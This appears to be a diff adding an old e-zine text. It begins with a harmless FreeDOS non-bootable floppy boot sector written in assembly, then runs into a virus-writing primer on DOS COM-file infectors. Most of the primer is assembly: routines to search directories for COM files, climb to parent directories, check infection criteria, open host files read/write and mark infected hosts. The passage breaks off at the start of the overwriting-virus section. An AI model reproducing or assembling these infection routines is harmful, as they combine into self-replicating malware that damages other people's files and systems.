+FATtype  db    'FAT-12  '       ; FAT type
+         db    'VeRsIoN=1.0', 0 ; for version control only
+; ----------------------
+
+L1:      push  si               ; stack up return address
+         ret                    ; and jump to it
+
+print:   pop   si               ; this is the first character
+         mov   bx, 0            ; video page 0
+L0:      lodsb                  ; get token
+         cmp   al, 0            ; end of string?
+         je    L1               ; if so, exit
+         mov   ah, 0E           ; else print it
+         int   010              ; via TTY mode
+         jmp   L0               ; until done
+; ----------------------
+
+main:    cld                    ; init direction flag
+         cli                    ; take care of 1 faulty batch of 88's in 1980
+         mov   ax, 07C0         ; this is the segmentvalue at start
+         mov   ds, ax           ; store it in DS, ES
+         mov   es, ax
+         mov   ax, 0            ; clear ax ...
+         mov   ss, ax           ; ... to prime the SS register
+         mov   sp, 07C00        ; set stackpointer
+         sti                    ; OK, interrupts may come again
+         call  print            ; show that message
+         db    cr
+         db    'This is not a bootable floppy. '
+         db    'Please strike any key to reboot.', cr, lf
+         db    'This floppy disk is formatted by FreeDOS', cr, lf, lf
+         db    'Please visit us at www.freedos.org', cr, lf, 0
+
+L0:      mov   ah, 1            ; wait for keypress by ...
+         int   016              ; ...  interrogating keyboard
+         jz    L0               ; if no key pressed, loop back
+         mov   ax, 0            ; else address system variables
+         mov   es, ax           ; in order to ...
+      es mov   w [0472], 01234  ; signal: NO POST and go on ...
+         jmp   0FFFF:0000       ; with the next reboot
+
+         org   01FE             ; look for the dotted line and ...
+         db    055, 0AA         ; ... don't forget to sign!
+
+------------------------------------------------- Code file -----
+
+The first three lines are straightforward: name, title and page. Not
+much to tell about that. Then some version info for the programmer, some
+equates and the ORG statement.
+
+If no ORG is supplied, A86 will assume it is ORG 0100. I ordered an ORG   0,
+which means several things:
+
+ - start assembly at address 0
+ - the output file will be called *.BIN
+
+Bootsectors must start with some particular bytes. Therefore the first
+three bytes need to be either a short jump, a variable offset plus a
+NOP. Or a (long) jump without a NOP.
+
+At offset 03 of the bootsector starts the DPB (Disk Parameter Block)
+which tells the OS what kind of disk this is. It starts off with an OEM
+name. Please put ASCII in there, or virus scanners might trip on it with
+a "Bloodhound warning".
+
+After the description of the geometry of this disk, I included an
+extended boot signature, since we have ample room left. It contains
+Volume ID, Disk Label, and FAT-type strings.
+
+The PRINT subroutine is a nice one. It will print the ASCIIZ string that
+follows it. This is quite a handy routine since you can simply change
+messages without having to worry about the address and length of the
+actual message.
+
+Print is called like this:
+
+        call   print
+        db     'Hello World', cr, lf, 0
+        ...
+
+Print takes the "return address" off the stack. This of course is no
+return address but the address of the message. What follows is easy:
+
+ - get next character
+ - IF  (non-zero)  print character  ELSE  leave loop  ENDIF
+ - the current si pointer is the actual return address... So we push it
+ - and return to caller.
+
+Perhaps a jmp  si could be possible too, but I like clear code, in most
+cases. If you need obfuscated code, switch to C. :)
+
+The actual program is very simple. It just sets up a stack and the
+segment registers, and then prints that it will do nothing. Gee, what a
+life...
+
+After the message we wait for a key and next signal:
+
+ - fast reboot
+ - jump to the reboot vector
+
+Whatever there will be between end of code and offset 01FE is not
+relevant (it could be your ad) but the last two bytes of the boot sector
+must be a valid boot signature.
+
+That's it. With this code you can make your own custom non-bootsector.
+
+I hope this software has also shown that linking and assuming are
+supported by A86, but certainly not necessary. Also, this software does
+not rely on any HLL calls. It's just assembly language as it should be.
+
+I want to remark that this software is Open Source, according to the rules
+of the GNU GPL. Make sure you understand these rules before embedding this
+routine in your own software.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+                                                   A Basic Virus Writing Primer
+                                                   by Chili
+
+
+What horror  must the ignorant victim  undergo as it  becomes aware  of a being
+that lives inside its own body, growing ever stronger, reproducing itself until
+its host, unable to bear more finally colapses and dies an horrible death. What
+panic  it must  feel,  knowing nothing  can be  done  in time  to avoid  such a
+terrible fate.  A predator so tiny, that unsuspectedly it spreads from one host
+to  another,  by  so  rapidly  infecting  millions.  An  organism,  so  utterly
+resourceful and small, that it stays most of the time undetectable, breeding in
+the shadows.
+
+Computer viruses aren't much  different from their biological counterpart,  but
+instead of infecting cells they infect files and boot sectors.  In this article
+I'll try to explain the basics of file viruses,  more specifically runtime (aka
+direct  action)  COM  infectors.   This  will  cover  most  simple  search  and
+replication  methods used and  is only to be  considered as an  introduction to
+virus writing.  After some thought I've decided not  to include any full source
+code  for a  working virus,  since anyone  with  half  a brain  and a  somewhat
+mediocre  knowledge of assembly can  easily build a virus out  of the pieces of
+code  that will  be presented.  Furthermore  it's not  my wish to  increase the
+number of viruses in the wild, thing that would undoubtedly happen by the hands
+of some I-have-no-brain-and-can't-program-hellspawn bent on random destruction.
+Anyway, on with the article...
+
+
+Some Sort Of 'Programming Virii Safely' Guide
+---------------------------------------------
+The only really safe way  to program viruses  is to know what you're  doing and
+understand at  every time how the virus is behaving.  If you test a virus on your
+own machine without fully comprehending its ins and outs, then you will most
+likely have your system trashed. It would be best if you had a second computer
+just for this purpose, since a buggy programming can lead to a lot of crashes
+and general havoc.  If not, a Ramdrive can be created and a Subst can be done,
+so that all accesses to  physical drives are  redirected to the virtual one.
+Assuming that you want your Ramdrive to have 512-byte sectors, a limit of 1024
+entries and to allocate 2048K of extended memory,  you must add this line to your
+CONFIG.SYS:
+
+DEVICE=C:\DOS\RAMDRIVE.SYS 2048 512 1024 /E
+
+Then you must copy COMMAND.COM  and SUBST.EXE to the Ramdrive so that DOS won't
+hang and also in order for you to be able to delete all redirections when done.
+And to associate all  physical drives to the newly  created virtual drive  (and
+assuming that it is D: and all your drives are A: and C:) you should do:
+
+SUBST A: D:\
+SUBST C: D:\
+
+Of course this last method isn't  perfect. You should always know how to
+completely remove a virus before running it, or you'll end cleaning up the mess
+for quite some time.
+
+Just use  common sense.  For example,  if  you're  writing a  virus aimed  at a
+specific file type,  all you have  to do is copy all files of that  type you do
+not wish to  be infected to a different extension and when  you're done testing
+just  switch those files  back to their original extension.  While testing  you
+should  also place breakpoints  and warning  messages throughout  the code,  so
+that you know at all times what  the virus is doing as well as it will help you
+debugging it. Also you should program and test different routines separately as
+it will reduce complexity and bug proneness.  Lastly the use of memory and disk
+mapping/editing utilities,  a set of good anti-virus and most important the use
+of backups is encouraged, so that you can keep track  of things and are able to
+restore your system in case something goes wrong.
+
+In case things  get really out of hand  you should always  have a clean "rescue
+disk" which you should  create by doing a FORMAT A: /S /U and then copying into
+it some  useful DOS files  like FORMAT.COM,  UNFORMAT.COM, FDISK.EXE,  SYS.COM,
+MEM.EXE,  ATTRIB.EXE, DEBUG.EXE,  CHKDSK.EXE, SUBST.EXE,  a text editor just in
+case and whichever other  files you may find useful.  Also an anti-virus should
+be included along.  Don't forget to write protect the disk and put it in a safe
+place.  The first thing  you should  do in order to clean  up your system is to
+boot from  your  previously  created disk  and  use your  anti-virus clean  and
+restoration features, as most times this will work, saving you a lot of hassle.
+In last resort,  you should run FDISK /MBR to re-write the  executable code and
+error messages of the partition sector,  then run FDISK and first delete,  then
+create a new partion table and finally run FORMAT C: /S /U.  Your system should
+now be  completely clean and you can restore your backups at this time.  If all
+you want is to clean a floppy disk instead of a hard disk, then all you have to
+do is run FORMAT A: /S /U to create a new boot sector,  FAT and root directory.
+Of course that after this procedures all data will be lost, so as I said before
+this should only be used if you're really desperate.
+
+Above all, don't forget to backup, backup, backup!
+
+
+Tools & References
+------------------
+In order to write and test a sucessful virus  you need some useful programs and
+references, such as:
+
+- An assembler (TASM, MASM, Intel's ASM86, A86, NASM, ...) -  I recommend using
+  Turbo Assembler, as all code I will provide will be tested with it.
+- A linker (TLINK, LINK, Intel's LINK86...) - Again I recommend Turbo Linker.
+- A debugger (Dos' DEBUG, TD, ...) - Dos' DEBUG is old but will do the job, you
+  can use Turbo Debugger though, as it is somewhat better.
+- A text and a hex editor of your choice.
+- A disassembler (DEBUG, Sourcer, IDA, ...) - You can use Dos' DEBUG, but would
+  be better  if you used Sourcer which is very  good or IDA which  is excellent
+  but very large in size.
+- Some other things like TSR Utilities by TurboPower Software, Norton Utilities
+  and more.
+- A good set of Anti-Virus packages, such as ThunderBYTE Anti-Virus (as a great
+  set of utilities  to backup your bootsector,  partition table and CMOS),  AVP
+  (AntiViral Toolkit Pro) and F-PROT.  Also available are  McAfee (now  Network
+  Associates, I think) VirusScan, Dr.Solomon's AVTK and Norton Anti-Virus.
+- Ralph Brown's  x86/MSDOS Interrupt  List,  Norton Guides'  Assembly  Language
+  database, David Jurgens' HelpPC, DOSREF (Programmers' Technical Reference for
+  MSDOS and the IBM PC) and others you find useful.
+
+
+On Viruses
+----------
+There are two things that must always be present on every working virus,  first
+the search routine that seeks for  suitable targets for the virus to infect and
+lastly the replication routine that copies the virus to the found target. Other
+routines may also be added in order to enhance the virus and the two more basic
+and  essencial parts  can be improved,  increasing its performance,  albeit its
+complexity too.
+
+I intentionally left out a major routine, the payload (aka activation routine),
+though not necessary, it is present in almost all viruses.  Sincerely I see  no
+real use for  most activation routines,  since all they do is seriously cripple
+the virus's chance to spread. Besides, all good payloads must be custom made (as
+should all viruses,  but that's another story...), so you'll have to build your
+own if  you want one.  For some old  good examples of  non-destructive payloads
+take a look at Ambulance Car, Cascade, Den Zuk, Corporate Life and Crucifixion.
+
+All code presented hereafter was first tested on both of my machines and works,
+but this  doesn't mean that it will work on  all possible configurations,  so I
+can't fully guarantee that it won't ever cause unwanted damage. It's bad enough
+that  your virus  may unwillingly  trash someone's  data,  so don't go  writing
+destructive payloads just for the hell of it. Programming - and therefore virus
+writing - is an art, treat it as such.
+
+
+A Word On Error Trapping
+------------------------
+Error trapping is regrettably one of the most forgotten things in viruses.  You
+should always  account for errors in order not to  crash and even trash things.
+This doesn't mean that you should present cute DOS-like error messages, as this
+would  alert the  user,  instead you  should  process  the information  and act
+accordingly. That most times just means that you should abort the virus ongoing
+operations and restore control back to the host.
+
+
+Optimization
+------------
+All code will be presented in an unoptimized form for ease of understanding and
+also because all routines are shown  seperate from each other so  that they are
+portable to  different kinds of viruses.  When writing a full virus  you should
+always optimize your code, so that it takes as little space as possible.  Don't
+use procedures unless you can save space by doing so.  Also don't use variables
+when you can use registers (for example the F_Handle variable needs not be used
+since you could just use the stack or some free register - see below).
+
+
+Delta Offset
+------------
+When you're programming a virus that will always be placed at a fixed location,
+like overwriting  and prepending viruses,  you won't have to worry about any of
+this, but if you're writing a virus that relocates part of its code to a random
+location,  such as appending and midfile infectors,  you'll have to account for
+the  displacement.  This doesn't affect most  jumps and calls,  since they  are
+relative,  but data on the other hand is refered by an absolute offset.  Things
+would work fine the first  time you assembled and run the virus,  but not after
+the first infection when all memory addresses would then be changed.
+
+To account for this all one has to do is:
+
+--8<---------------------------------------------------------------------------
+Delta_Offset:
+        call    Find_Displacement
+Find_Displacement:
+        pop     bp
+        sub     bp, offset Find_Displacement
+---------------------------------------------------------------------------8<--
+
+What this piece of code does is, first issue a CALL to the next instruction, so
+the IP (Instruction Pointer) for it will pushed into the stack,  next we POP it
+to the  register BP  (it is good programming  to use BP,  which stands for Base
+Pointer), and finally we SUBtract the original OFFSET determined when the virus
+was compiled.  Of course the first time the virus is run, the displacement will
+be zero, only on subsequent runs will it change according to the host size.
+
+I'll be presenting code for infectors that require delta offset calculation, so
+for all the other infectors that don't, in order to accommodate any of the code
+presented hereafter you'll just have to strip out any displacement calculations
+as in the following examples:
+
+Replace
+        lea     dx, [bp+offset DTA]
+With
+        lea     dx, DTA
+
+Replace
+        mov     word ptr [bp+F_Handle], ax
+With
+        mov     F_Handle, ax
+
+Once you've given it a little thought and figured it out it's not as hard as it
+may  first seem.  Of course that  even if you're  programming a  fixed location
+virus you  can still leave all code as if you were writing one that  needed you
+to  calculate  the  delta  offset,  since  the  displacement  is  always  zero.
+Nevertheless you shouldn't do this,  mainly because it adds unnecessary size to
+the virus and it is extremely sloppy (and lazy) programming (copying?!?!).
+
+
+.COM File Structure
+-------------------
+COM files are raw binary executables,  designed for compatibility  with the old
+CP/M operating system.  Whenever a COM file is executed, DOS first sets aside a
+segment (64K) of memory for it,  then builds a PSP  (Program Segment Prefix) in
+the first  256 bytes,  after which the  program is loaded into.  Before passing
+control to the program DOS does some things first, among which are:
+
+   1) Register AX  reflects the validity  of drive specifiers  entered with the
+      first two parameters as follows:
+        AL=0FFh if the  first parameter  contained an invalid drive  specifier,
+                otherwise AL=00h
+        AL=0FFh if the second  parameter contained an invalid  drive specifier,
+                otherwise AL=00h
+
+   2) All four segment registers contain the segment address of the PSP control
+      block
+
+   3) The Instruction Pointer (IP) is set to 100h
+
+   4) The SP register is set to the  end of the program's segment and a word of
+      zeroes is placed on top of the stack
+
+In case  any of  this  things  are  changed  during  the virus  execution,  you
+shouldn't forget to restore them before passing control back to the host.
+
+So, given this, a COM file program can only have a maximum size of 65277 bytes,
+since you have to account for the PSP and  at least for the two  bytes occupied
+by the stack.  Here is how a COM file looks when loaded in memory:
+
+   FFFFh +--------------------+ <- SP
+         |                    |
+         |       Stack        |
+         |                    |
+         +--------------------+
+         |                    |
+         | Uninitialized Data |
+         |                    |
+         +--------------------+
+         |                    |
+         |   COM File Image   |
+         |                    |
+    100h +--------------------+ <- IP
+         |                    |
+         |        PSP         |
+         |                    |
+      0h +--------------------+ <- CS, DS, ES, SS
+
+Don't forget to account for  stack growth needed by your program as well as any
+uninitalized data, for if you don't there is a chance that it will crash, since
+the stack  may grow large  enough to overwrite  data or code,  or your data may
+wrap around and overwrite the PSP and the code.
+
+
+Program Segment Prefix (PSP)
+----------------------------
+A PSP is created  by DOS for all programs and contains  most of the information
+one needs to know about them. Its structure looks like this:
+
+   [ PSP - Program Segment Prefix ]
+
+   Offset       Size            Description
+   ------       ----            -----------
+   0h           Word            INT 20h instruction
+   2h           Word            Segment address of top of the current program's
+                                allocated memory
+   4h           Byte            Reserved
+   5h           Byte            Far call to DOS function dispatcher (INT 21h)
+   6h           Word            Available bytes in the segment for .COM files
+   8h           Word            Reserved
+   Ah           Dword           INT 22h termination address
+   Eh           Dword           INT 23h Ctrl-Break handler address
+   12h          Dword           DOS 1.1+ INT 24h critical error handler address
+   16h          Byte            Segment of parent PSP
+   18h       20 Bytes           DOS 2+ Job File Table (one byte per file handle
+                                FFh = available/closed)
+   2Ch          Word            DOS 2+ segment address of  process' environment
+                                block
+   2Eh          Dword           DOS 2+ process' SS:SP  on entry to last INT 21h
+                                function call
+   32h          Word            DOS 3+ number of entries in JFT
+   34h          Dword           DOS 3+ pointer to JFT
+   38h          Dword           DOS 3+ pointer to previous PSP
+   3Ch       20 Bytes           Reserved
+   50h        3 Bytes           DOS 2+ INT 21h/RETF instructions
+   53h        9 Bytes           Unused
+   5Ch       16 Bytes           Default unopened File Control Block 1 (FCB1)
+   6Ch       16 Bytes           Default unopened File Control Block 2 (FCB2)
+   7Ch        4 Bytes           Unused
+   80h          Byte            Command line length in bytes
+   81h      127 Bytes           Command line (ends with a Carriage Return 0Dh)
+
+Note:  For a more  detailed explanation  of the  PSP structure,  including many
+undocumented features, see Ralph Brown's x86/MSDOS Interrupt List.
+
+And here are the default file handles for the Job File Table (JFT):
+
+   [ DOS Default/Predefined File Handles]
+
+   0 - Standard Input Device, can be redirected (STDIN)
+   1 - Standard Output Device, can be redirected (STDOUT)
+   2 - Standard Error Device, can be redirected (STDERR)
+   3 - Standard Auxiliary Device (STDAUX)
+   4 - Standard Printer Device (STDPRN)
+
+The  File Control Block  (FCB)  and the  Environment Block  structures will  be
+covered on a later article, as they aren't needed for now.
+
+
+Disk Transfer Area (DTA)
+------------------------
+For all  file reads and writes  performed using FCB function calls,  as well as
+for "Find First"  and "Find Next" calls  using FCBs or not,  DOS uses a  memory
+buffer called Disk Transfer Area,  which is by default located at offset 80h in
+the PSP and is 128 bytes long (this area is also used by the command tail),  so
+in order  not to interfere with  whichever command line parameters  there might
+be,  the Disk Transfer Address should be set to a different location in memory.
+This is done like this:
+
+--8<---------------------------------------------------------------------------
+Set_DTA:
+        mov     ah, 1Ah
+        lea     dx, [bp+offset DTA]
+        int     21h
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      1Ah     - Set Disk Transfer Address (DTA)
+;On entry:      AH      - 1Ah
+;               DS:DX   - Address of DTA
+;Returns:       Nothing
+
+Of course  that before passing control  back to the host you should restore the
+Disk Transfer Address back to its original value:
+
+--8<---------------------------------------------------------------------------
+Restore_DTA:
+        mov     ah, 1Ah
+        mov     dx, 80h
+        int     21h
+---------------------------------------------------------------------------8<--
+
+A sufficient  buffer area  should always  be reserved,  as DOS will  detect and
+abort any disk transfers that would  fall off the end of the current segment or
+wrap around within the segment.
+
+
+FindFirst Data Block
+--------------------
+Upon a  successful "Find First Matching File"  function call the  Disk Transfer
+Area is filled with a  FindFirst Data Block which contains info on the matching
+file found, also after a  "Find Next Matching File" function call  that data is
+updated. As we'll only be using the DTA for this, all we need to when setting a
+new one is to have a 43 bytes long buffer so that we can allocate the FindFirst
+Data Block:
+
+--8<---------------------------------------------------------------------------
+DTA:
+   Reserv       db      21      dup     (?)
+   F_Attr       db      (?)
+   F_Time       dw      (?)
+   F_Date       dw      (?)
+   F_Size       dd      (?)
+   F_Name       db      13      dup     (?)
+---------------------------------------------------------------------------8<--
+
+And here is the FindFirst Data Block structure:
+
+   [ FindFirst Data Block ]
+
+   Offset       Size            Description
+   ------       ----            -----------
+   0h        21 Bytes           Reserved  for DOS  use on subsequent  Find Next
+                                calls - is different per DOS version
+   15h          Byte            Attribute of matching file
+   16h          Word            File time stamp
+   18h          Word            File date stamp
+   1Ah          Dword           File size in bytes
+   1Eh       13 Bytes           ASCIIZ filename and extension
+
+The file attribute field looks like this:
+
+   [File Attribute]
+
+   Bit(s)                       Description
+   ------                       -----------
+   7 6 5 4 3 2 1 0
+   . . . . . . . 1              Read-only
+   . . . . . . 1 .              Hidden
+   . . . . . 1 . .              System
+   . . . . 1 . . .              Volume label
+   . . . 1 . . . .              Directory
+   . . 1 . . . . .              Archive
+   x x . . . . . .              Unused
+
+The file time field is like this:
+
+   [File Time]
+
+   Bit(s)                               Description
+   ------                               -----------
+   F E D C B A 9 8 7 6 5 4 3 2 1 0
+   . . . . . . . . . . . x x x x x      Seconds/2 (0..29) - 2 second increments
+   . . . . . x x x x x x . . . . .      Minutes (0..59)
+   x x x x x . . . . . . . . . . .      Hours (0..23)
+
+And finally the file date field like this:
+
+   [File Date]
+
+   Bit(s)                               Description
+   ------                               -----------
+   F E D C B A 9 8 7 6 5 4 3 2 1 0
+   . . . . . . . . . . . x x x x x      Day (1..31)
+   . . . . . . . x x x x . . . . .      Month (1..12)
+   x x x x x x x . . . . . . . . .      Year since 1980 (0..119)
+
+
+Current Directory Preservation
+------------------------------
+If you're searching  for files outside the  directory where your virus  was run
+from, you must save the old directory and restore it when you're done. First to
+save it you must do:
+
+--8<---------------------------------------------------------------------------
+Get_Directory:
+        mov     ah, 47h
+        mov     dl, 0
+        lea     si, [bp+offset Orig_Dir]
+        int     21h
+        jnc     Find_First
+        jmp     Return_Control
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      47h     - Get Current Directory
+;On entry:      AH      - 47h
+;               DL      - Drive number (0=default, 1=A, etc.)
+;               DS:SI   - Pointer to a 64-byte buffer
+;Returns:       AX      - Error code, if CF is set
+;Error codes:   15      - Invalid drive specified
+;Notes: This  function returns  the full  pathname  of the  current  directory,
+;       excluding  the drive designator and initial backslash character,  as an
+;       ASCIIZ string at the memory buffer pointed to by DS:SI.
+
+A 64 byte long buffer must be present to hold the original directory:
+
+--8<---------------------------------------------------------------------------
+Orig_Dir        db      64    dup     (?)
+---------------------------------------------------------------------------8<--
+
+Then before actually restoring to the old directory, you must first change to
+the root directory and then restore from there, since all paths are relative to
+it.
+
+--8<---------------------------------------------------------------------------
+ChangeTo_Root:
+        mov     ah, 3Bh
+        lea     dx, [bp+offset Root]
+        int     21h
+        jc      Restore_DTA
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      3Bh     - Change Directory (CHDIR)
+;On entry:      AH      - 3Bh
+;               DS:DX   - Pointer  to name of  new  default  directory  (ASCIIZ
+;                         string)
+;Returns:       AX      - Error code, if CF is set
+;Error Codes:   3       - Path not found
+;Notes: This function changes the current directory to the directory whose path
+;       is specified in the  ASCIIZ string at address DS:DX;  the string length
+;       is limited to 64 characters.  The path name may include a drive letter.
+
+A buffer containing a ASCIIZ string representing the root:
+
+--8<---------------------------------------------------------------------------
+Root            db      '\', 0
+---------------------------------------------------------------------------8<--
+
+And finally you switch to the original directory  (if the original directory is
+the root there  will be an error since  the path won't be valid -  this doesn't
+matter since we changed to root before):
+
+--8<---------------------------------------------------------------------------
+Restore_Directory:
+        mov     ah, 3Bh
+        lea     dx, [bp+offset Orig_Dir]
+        int     21h
+        ;jc      Restore_DTA            ;No need, since it's right after
+---------------------------------------------------------------------------8<--
+
+If you change drives while searching for files to infect  (this will be covered
+in a next article) you should also preserve the original drive and then restore
+it in the end.
+
+
+File Search Techniques
+----------------------
+A runtime  virus  can  infect  files  located  in  the  current  directory,  in
+subdirectories,  maybe only in root,  in the PATH and even on different drives.
+You must  be very careful when writing  your search routine,  since if you only
+infect files  in a few places your  virus won't spread much,  but if you search
+for files to infect in every possible place, after the first infections it will
+start to take much  longer to find new hosts  (since most are already infected)
+and  disk activity might  last for long  enough to be  noticeable. Some of this
+techniques are presented below. The others will be presented on a next article.
+
+
+Find First/Find Next
+--------------------
+This is used when you want to search for files on a the current directory.  You
+start by searching for the first matching COM file with normal attributes:
+
+--8<---------------------------------------------------------------------------
+Find_First:
+        mov     ah, 4Eh
+        mov     cx, 0
+        lea     dx, [bp+offset COM_Mask]
+        int     21h
+        jnc     Open_File
+        jmp     Return_Control
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      4Eh     - Find First Matching File (FIND FIRST)
+;On entry:      AH      - 4Eh
+;               CX      - File attribute
+;               DS:DX   - Pointer to filespec (ASCIIZ string)
+;Returns:       AX      - Error code, if CF is set
+;Error codes:   2       - File not found
+;               3       - Path not found
+;               18      - No more files to be found
+;Notes: If CX  is 0,  the function  searches  for  normal  files  only.  If  CX
+;       specifies any combination of the hidden, system, or directory attribute
+;       bits,  the search matches  normal files and  also any files with  those
+;       attributes.  If CX specifies the  volume label attribute,  the function
+;       looks only for entries with the volume label attribute. The archive and
+;       read-only attribute bits have no effect on the search operation.
+
+A buffer holding the filespec must be present:
+
+--8<---------------------------------------------------------------------------
+COM_Mask        db      "*.COM", 0
+---------------------------------------------------------------------------8<--
+
+Then if  you're not done  infecting or if  the file didn't  pass your infection
+criteria you can look for some more files matching the same specifications:
+
+--8<---------------------------------------------------------------------------
+Find_Next:
+        mov     ah, 4Fh
+        int     21h
+        jc      Return_Control          ;Replace with  'jc ChangeTo_Parent'  if
+                                        ; using the "dot dot" method
+        jmp     Open_File
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      4Fh     - Find Next Matching File (FIND NEXT)
+;On entry:      AH      - 4Fh
+;Returns:       AX      - Error code, if CF is set
+;Error codes:   18      - No more files to be found
+
+
+"Dot Dot"
+---------
+If you wish to infect files on  different directories one curious and very easy
+way  of  doing so  is using  the "dot dot"  method  which  jumps to  the parent
+directory until your virus is satisfied or until it reaches the root:
+
+--8<---------------------------------------------------------------------------
+ChangeTo_Parent:
+        mov     ah, 3Bh
+        lea     dx, [bp+offset Parent_Dir]
+        int     21h
+        jc      Return_Control
+        jmp     Find_First
+---------------------------------------------------------------------------8<--
+
+A buffer representing the parent directory in ASCIIZ string format must exist:
+
+--8<---------------------------------------------------------------------------
+Parent_Dir      db      "..", 0
+---------------------------------------------------------------------------8<--
+
+
+Infection Criteria
+------------------
+Since a COM file is always less  than 65536 bytes it's easy to compare its size
+against our criteria.  Don't forget that you  must account for the  virus size,
+the stack, the PSP (just in case) and any uninitialized data:
+
+--8<---------------------------------------------------------------------------
+Check_Size:
+        cmp     word ptr [bp+F_Size+2], 0
+        je      Check_PlusVirus
+        jmp     Close_File
+Check_PlusVirus:
+        mov     ax, word ptr [bp+F_Size]
+        add     ax, offset Virus_End - offset Virus_Start + 4 + 256 + 109
+        jnc     PointTo_Begin
+        jmp     Close_File
+---------------------------------------------------------------------------8<--
+
+Other criterias will be covered on later articles.
+
+
+Opening/Closing the Host
+------------------------
+For now we will not worry about read-only files, so we will open the file in
+read/write mode as this will fail on read-only files:
+
+--8<---------------------------------------------------------------------------
+Open_File:
+        mov     ah, 3Dh
+        mov     al, 00000010B
+        lea     dx, [bp+offset F_Name]  ;Replace  with  'mov dx, 9Eh'  for  the
+                                        ; overwriting virus since the file name
+                                        ; in the DTA is in the PSP (80h+1Eh)
+        int     21h
+        jnc     Save_Handle
+        jmp     Find_Next
+Save_Handle:
+        mov     word ptr [bp+F_Handle], ax
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      3Dh     - Open a File
+;On entry:      AH      - 3Dh
+;               AL      - Open mode
+;               DS:DX   - Pointer to filename (ASCIIZ string)
+;Returns:       AX      - File handle
+;                         Error code, if CF is set
+;Error codes:   1       - Function number invalid
+;               2       - File not found
+;               3       - Path not found
+;               4       - No handle available
+;               5       - Access denied
+;               12      - Open mode invalid
+;Notes: The function opens any existing file,  including hidden files, and sets
+;       the record size to 1 byte.
+
+And here is the format of the open mode byte:
+
+   [Open Mode]
+
+   Bit(s)               Open Mode               Description
+   ------               ---------               -----------
+   7 6 5 4 3 2 1 0
+   . . . . . x x x      Access mode             Read/Write access
+   . . . . x . . .      Reserved                Must always be zero
+   . x x x . . . .      Sharing mode            Must be 0 in DOS 2.x
+   x . . . . . . .      Inheritance flag        Must be 0 in DOS 2.x
+
+   [Access Mode]
+
+   Bit(s)       Access Mode
+   ---          -----------
+   2 1 0
+   0 0 0        Read-only access
+   0 0 1        Write-only access
+   0 1 0        Read/write access
+
+   [Sharing Mode]
+
+   Bit(s)       Sharing Mode
+   ---          ------------
+   6 5 4
+   0 0 0        Compatibility mode
+   0 0 1        Deny Read/Write mode (Exclusive mode)
+   0 1 0        Deny Write mode
+   0 1 1        Deny Read mode
+   1 0 0        Deny None mode
+
+   [Inheritance Flag]
+
+   Bit          Inheritance Flag
+   ---          ----------------
+   7
+   0            File is inherited by child processes
+   1            File is not inherited
+
+There should be a buffer for the file handle:
+
+--8<---------------------------------------------------------------------------
+F_Handle        dw      (?)
+---------------------------------------------------------------------------8<--
+
+And when you're done with the file you close it:
+
+--8<---------------------------------------------------------------------------
+Close_File:
+        mov     ah, 3Eh
+        mov     bx, word ptr [bp+F_Handle]
+        int     21h
+        jnz     Return_Control          ;Because of the <Copy_Body> routine
+        jnc     Find_Next
+        jmp     Return_Control
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      3Eh     - Close a File Handle
+;On Entry:      AH      - 3Eh
+;               BX      - File handle
+;Returns:       AX      - Error code, if CF is set
+;Error codes:   6       - Invalid handle
+;Notes: This function flushes the file's buffers, closes the file, releases the
+;       handle, and updates the directory.
+
+
+Self-Recognition
+----------------
+This is very important,  since if you don't check for prior infection you might
+end up  making the host  grow beyond  the maximum  permitted size.  There are a
+number of ways  of doing this,  you can check for  some sort of marker,  a time
+stamp can  be placed  on the host and others.  Only the  marker method  will be
+covered in this article.
+
+
+Marker Byte
+-----------
+The marker byte is  located at the beginning of  the file and is preceded  by a
+jump to  the real start of  the virus  (it has to be coded  "manually" since it
+doesn't assemble correctly):
+
+--8<---------------------------------------------------------------------------
+Host:
+        db      0E9h, 2, 0              ;This  is a near  jump to  Virus_Start,
+                                        ; which is  supposed to be  right after
+                                        ; the ID marker
+        db      'ID'
+---------------------------------------------------------------------------8<--
+
+To read the first five bytes of an open file this is what you do:
+
+--8<---------------------------------------------------------------------------
+Read_Five:
+        mov     ah, 3Fh
+        mov     bx, word ptr [bp+F_handle]
+        mov     cx, 5
+        lea     dx, [bp+offset IDMark]
+        int     21h
+        jnc     And_Also
+        jmp     Close_File
+And_Also:
+        cmp     cx, ax
+        jz      Check_IDMark
+        jmp     Close_File
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      3Fh     - Read from File or Device, Using a Handle
+;On entry:      AH      - 3Fh
+;               BX      - File handle
+;               CX      - Number of bytes to read
+;               DS:DX   - Address of buffer
+;Returns:       AX      - Number of bytes read, or
+;                         Error code, if CF is set
+;Error codes:   5       - Access denied
+;               6       - Invalid handle
+;Network: Requires Read access rights
+;Notes: Data is read  starting at the location  pointed to by the file pointer.
+;       The file  pointer is  incremented by the  number of bytes read.  If the
+;       Carry Flag is  not set and AX = 0,  the file pointer was  at the end of
+;       the file  when the function  was called.  If the Carry Flag  is not set
+;       and AX is less than the number of bytes requested,  either the function
+;       read to the end of the file, or an error occurred.
+
+A 5 bytes long buffer must exist (this will hold a dummy host the first time it
+is run - all it does is exit to DOS):
+
+--8<---------------------------------------------------------------------------
+IDMark          db      0CDh, 20h, 90h, 90h, 90h
+---------------------------------------------------------------------------8<--
+
+And to see if a valid ID marker exists in the five bytes read:
+
+--8<---------------------------------------------------------------------------
+Check_IDMark:
+        cmp     word ptr [bp+IDMark+3], 'DI'
+        jnz     Check_Size
+        jmp     Close_File
+---------------------------------------------------------------------------8<--
+
+
+Parasitic Replication Methods
+-----------------------------
+Only two examples  of parasitic viruses will be covered,  first the overwriting
+which doesn't need any displacement  calculations and after the appending virus
+that needs those calculations. Other types of parasitic viruses such as midfile
+infectors,  prepending viruses  as non-parasitic  ones such  as companion  (aka
+spawning) viruses will be covered on future articles.
+
+
+An Overwriting Virus
+--------------------
+As its  name says,  this type of virus  overwrites part of its host,  making it
+unnable to execute as  it is destroyed beyond repair.  And here is how it works
